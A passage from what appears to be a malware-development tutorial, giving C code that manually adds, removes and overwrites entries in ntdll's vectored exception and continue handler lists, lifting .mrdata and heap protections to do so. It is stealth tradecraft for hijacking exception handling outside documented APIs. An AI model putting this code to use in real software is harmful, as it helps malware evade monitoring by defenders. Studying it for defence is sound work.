		pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>

		<span class="token comment">// Our entry is last, needs to point to the start</span>
		pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVchListStart<span class="token punctuation">;</span>

		<span class="token comment">// Make our entry point to the original last entry</span>
		pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVectoredHandlerEntry<span class="token punctuation">;</span>

		<span class="token comment">// Update the list</span>
		pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Release the VEH lock</span>
	<span class="token function">ReleaseSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVCH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Revert .mrdata protection (make R/O)</span>
	<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Refs <span class="token operator">=</span> <span class="token operator">&amp;</span>g_Ref<span class="token punctuation">;</span>
	pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>VectoredHandler <span class="token operator">=</span> <span class="token function">EncodePointer</span><span class="token punctuation">(</span>pHandlerFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Entry Successfully Added @ 0x%p \n"</span><span class="token punctuation">,</span> pNewVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-28">RemoveVectoredExceptionHandlerReplacement And RemoveVectoredContinueHandlerReplacement Functions</h3>
<p>The provided implementation also includes custom functions for <code>RemoveVectoredExceptionHandler</code> and <code>RemoveVectoredContinueHandler</code>. These functions follow the below steps:</p>
<ol>
<li>
<p>Resolve the address of <code>LdrpVectorHandlerList</code>.</p>
</li>
<li>
<p>Resolve the address of <code>LdrProtectMrdata</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrEnsureMrdataHeapExists</code>.</p>
</li>
<li>
<p>Acquire exclusive access to the corresponding lock and locate the <code>VECTORED_HANDLER_ENTRY</code>.</p>
</li>
<li>
<p>Unprotect (remove the RO memory protection) <code>.mrdata</code> and, if CFG is active, unprotect <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>Unlink the entry and update <code>PEB.CrossProcessFlags</code> if the list becomes empty.</p>
</li>
<li>
<p>Free the <code>VECTORED_HANDLER_ENTRY</code> from the appropriate heap.</p>
</li>
<li>
<p>Re-protect <code>.mrdata</code> and <code>LdrpMrdataHeap</code> if needed.</p>
</li>
<li>
<p>Release the lock.</p>
</li>
</ol>
<h4 id="toc-heading-29">Full RemoveVectoredExceptionHandlerReplacement Function</h4>
<p>The <code>RemoveVectoredExceptionHandlerReplacement</code> function is shown below, where it accepts the following parameters:</p>
<ul>
<li><code>pHandlerEntry</code> - A pointer to the VEH entry to be removed.</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">RemoveVectoredExceptionHandlerReplacement</span><span class="token punctuation">(</span>IN PVOID pHandlerEntry<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BOOL					bCfg					<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bUnprotected			<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bSuccess				<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
	PVOID					pVehListStart			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	HANDLE					hHeap					<span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_ENTRY<span class="token operator">*</span>	pVectoredHandlerEntry	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_LIST<span class="token operator">*</span>	pLdrpVectorHandlerList	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnLdrProtectMrdata		pLdrProtectMrdata		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnRtlProtectHeap		pRtlProtectHeap			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	HMODULE					hNtdll <span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"NTDLL.DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pHandlerEntry<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVectoredHandlerList</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to Get LdrpVectorHandlerList \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrProtectMrdata</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrProtectMrdata \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pRtlProtectHeap <span class="token operator">=</span> <span class="token punctuation">(</span>fnRtlProtectHeap<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlProtectHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	pVehListStart <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLdrpVectorHandlerList <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>VECTORED_HANDLER_LIST<span class="token punctuation">,</span> FirstVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">AcquireSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pVectoredHandlerEntry <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH<span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>pVectoredHandlerEntry <span class="token operator">!=</span> pVehListStart<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pVectoredHandlerEntry <span class="token operator">==</span> pHandlerEntry<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>FALSE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>
			bUnprotected <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

			bCfg <span class="token operator">=</span> <span class="token function">CheckCFGStatus</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>

				<span class="token comment">// If CFG is enabled, entries are at the start of LdrpMrdataHeap</span>
				<span class="token comment">// Align address down to get the base of LdrpMrdataHeap</span>
				hHeap <span class="token operator">=</span> <span class="token function">PAGE_ALIGN_DOWN</span><span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// Check if single entry</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">==</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH<span class="token punctuation">)</span> <span class="token punctuation">{</span>

				pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>
				pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>
				<span class="token function">FlipBit</span><span class="token punctuation">(</span>PROCESS_USING_VEH<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span> <span class="token punctuation">{</span>

				<span class="token comment">// Check if first entry</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">==</span> pVehListStart<span class="token punctuation">)</span> <span class="token punctuation">{</span>

					<span class="token comment">// Update the start to point to the next entry in the entry we are removing</span>
					pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>

					<span class="token comment">// Update the backwards link in our forwards entry</span>
					<span class="token punctuation">(</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">else</span> <span class="token punctuation">{</span>

					<span class="token comment">// Check if last entry</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">==</span> pVehListStart<span class="token punctuation">)</span> <span class="token punctuation">{</span>

						<span class="token comment">// Update LastVEH to point to our entries backwards link</span>
						pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink<span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
					<span class="token keyword">else</span> <span class="token punctuation">{</span>
						<span class="token comment">// Update the backwards link in our forwards entry to point to our backwards link instead of us</span>
						<span class="token punctuation">(</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink<span class="token punctuation">;</span>
					<span class="token punctuation">}</span>

					<span class="token comment">// Update the forwards link in our backwards entry to point to our forwards link instead of us</span>
					<span class="token punctuation">(</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink<span class="token punctuation">)</span><span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token function">ZeroMemory</span><span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">HeapFree</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Removed Handler Entry @ 0x%p\n"</span><span class="token punctuation">,</span> pHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

			bSuccess <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		pVectoredHandlerEntry <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bUnprotected<span class="token punctuation">)</span>
		<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">ReleaseSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> bSuccess<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-30">Full RemoveVectoredContinueHandlerReplacement Function</h4>
<p>The <code>RemoveVectoredContinueHandlerReplacement</code> function 
shares the same prototype as its VEH counterpart; the only difference 
lies in which members are inspected and modified. <code>RemoveVectoredContinueHandlerReplacement</code> is listed below, accepting a single parameter:</p>
<ul>
<li><code>pHandlerEntry</code> - A pointer to the VCH entry to be removed.</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">RemoveVectoredContinueHandlerReplacement</span><span class="token punctuation">(</span>IN PVOID pHandlerEntry<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BOOL					bCfg					<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bUnprotected			<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bSuccess				<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
	PVOID					pVchListStart			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	HANDLE					hHeap					<span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_ENTRY<span class="token operator">*</span>	pVectoredHandlerEntry	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_LIST<span class="token operator">*</span>	pLdrpVectorHandlerList	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnLdrProtectMrdata		pLdrProtectMrdata		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnRtlProtectHeap		pRtlProtectHeap			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	HMODULE					hNtdll <span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"NTDLL.DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pHandlerEntry<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVectoredHandlerList</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to Get LdrpVectorHandlerList \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrProtectMrdata</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrProtectMrdata \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pRtlProtectHeap <span class="token operator">=</span> <span class="token punctuation">(</span>fnRtlProtectHeap<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlProtectHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	pVchListStart <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLdrpVectorHandlerList <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>VECTORED_HANDLER_LIST<span class="token punctuation">,</span> FirstVCH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">AcquireSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVCH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pVectoredHandlerEntry <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH<span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>pVectoredHandlerEntry <span class="token operator">!=</span> pVchListStart<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pVectoredHandlerEntry <span class="token operator">==</span> pHandlerEntry<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>FALSE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>
			bUnprotected <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

			bCfg <span class="token operator">=</span> <span class="token function">CheckCFGStatus</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>

				<span class="token comment">// If CFG is enabled, entries are at the start of LdrpMrdataHeap</span>
				<span class="token comment">// Align address down to get the base of LdrpMrdataHeap</span>
				hHeap <span class="token operator">=</span> <span class="token function">PAGE_ALIGN_DOWN</span><span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// Check if single entry in the list</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH <span class="token operator">==</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVCH<span class="token punctuation">)</span> <span class="token punctuation">{</span>

				pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH <span class="token operator">=</span> pVchListStart<span class="token punctuation">;</span>
				pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVCH <span class="token operator">=</span> pVchListStart<span class="token punctuation">;</span>
				<span class="token function">FlipBit</span><span class="token punctuation">(</span>PROCESS_USING_VCH<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span> <span class="token punctuation">{</span>

				<span class="token comment">// Check if first entry</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">==</span> pVchListStart<span class="token punctuation">)</span> <span class="token punctuation">{</span>

					<span class="token comment">// Update the start to point to the next entry in the entry we are removing</span>
					pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>

					<span class="token comment">// Update the backwards link in our forwards entry</span>
					<span class="token punctuation">(</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVchListStart<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">else</span> <span class="token punctuation">{</span>

					<span class="token comment">// Check if last entry</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">==</span> pVchListStart<span class="token punctuation">)</span> <span class="token punctuation">{</span>

						<span class="token comment">// Update LastVCH to point to our entries backwards link</span>
						pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVCH <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink<span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
					<span class="token keyword">else</span> <span class="token punctuation">{</span>
						<span class="token comment">// Update the backwards link in our forwards entry to point to our backwards link instead of us</span>
						<span class="token punctuation">(</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink<span class="token punctuation">;</span>
					<span class="token punctuation">}</span>

					<span class="token comment">// Update the forwards link in our backwards entry to point to our forwards link instead of us</span>
					<span class="token punctuation">(</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span>pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink<span class="token punctuation">)</span><span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token function">ZeroMemory</span><span class="token punctuation">(</span>pVectoredHandlerEntry<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">HeapFree</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Removed Handler Entry @ 0x%p\n"</span><span class="token punctuation">,</span> pHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

			bSuccess <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		pVectoredHandlerEntry <span class="token operator">=</span> pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bUnprotected<span class="token punctuation">)</span>
		<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">ReleaseSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVCH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> bSuccess<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-31">Handler Overwriting</h3>
<p>Instead of adding a vectored handler ourselves, it is also possible 
to simply overwrite the first (or any other) registered vectored 
handler. Overwriting the first VEH is demonstrated by the <code>OverwriteFirstVectoredExceptionHandler</code> function shown below. The <code>OverwriteFirstVectoredExceptionHandler</code> function accepts a single parameter:</p>
<ul>
<li><code>pHandler</code> - A pointer to overwrite the first registered VEH with.</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">OverWriteFirstVectoredExceptionHandler</span><span class="token punctuation">(</span>IN PVOID pHandler<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PVOID					pHeap					<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	DWORD					dwOld					<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	BOOL					bCfg					<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bLocked					<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bSuccess				<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
	VECTORED_HANDLER_LIST<span class="token operator">*</span>	pLdrpVectorHandlerList	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnRtlProtectHeap		pRtlProtectHeap			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

